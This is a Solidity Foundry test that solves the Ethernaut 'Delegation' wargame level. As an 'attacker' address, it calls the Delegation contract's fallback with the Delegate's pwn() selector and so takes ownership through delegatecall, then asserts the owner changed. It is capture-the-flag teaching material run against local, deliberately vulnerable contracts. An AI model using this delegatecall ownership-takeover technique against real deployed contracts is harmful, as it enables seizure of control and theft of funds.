// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegate, Delegation} from "src/ethernaut-006-delegation/Delegation.sol";
import {Test, console} from "forge-std/Test.sol";

contract DelegationTest is Test {
    Delegation public delegation;
    Delegate public delegate;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
    }

    function testExploitDelegation() public {
        vm.startPrank(attacker);
        // 1. call the fallback function of the delegation contract
        bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector);
        (bool success,) = address(delegation).call(data);

        // 2. check if the owner is updated
        assertEq(delegation.owner(), attacker);

        // 3. check if the delegate is updated
        assertNotEq(delegate.owner(), attacker);

        vm.stopPrank();
    }
}
